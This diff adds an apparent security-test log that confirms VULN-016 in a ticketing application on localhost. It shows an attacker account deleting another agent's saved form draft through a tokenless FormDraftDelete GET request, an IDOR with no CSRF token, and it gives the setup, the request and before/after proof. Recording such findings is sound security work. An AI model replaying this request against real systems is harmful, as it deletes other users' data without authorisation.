@@ -1,0 +1,14 @@
+==========================================================================
+VULN-016: AgentTicketZoom;FormDraftDelete cross-user draft deletion
+Target: http://localhost:25114
+[INFO] FormDraftDelete scopes on id only (no owner check); AgentTicketZoom has no ChallengeTokenCheck
+==========================================================================
+[SETUP] victim agent vic016_289bf504 (uid 84); ticket 72
+[SETUP] victim saved FormDraft id=3
+[PROOF] attacker att016_289bf504 owns draft 3? [['84']] (victim uid=84)
+[PROOF] victim draft before attack: [['3', 'VictimDraft_289bf504']]
+[STEP] attacker GET FormDraftDelete FormDraftID=3 (TicketID=73 = attacker's own, ro)
+[INFO] HTTP 200 body head: '{"Success":1}'
+[PROOF] victim draft after attack: []
+[OK] exploit confirmed — attacker att016_289bf504 deleted victim vic016_289bf504's saved FormDraft id=3 via a tokenless GET, authorised only by ro on the attacker's own unrelated ticket — cross-user draft deletion (IDOR) with no CSRF token.
+==> VULN-016: CONFIRMED — attacker att016_289bf504 deleted victim vic016_289bf504's saved FormDraft id=3 via a tokenless GET, authorised only by ro on the attacker's own unrelated ticket — cross-user draft deletion (IDOR) with no CSRF token.
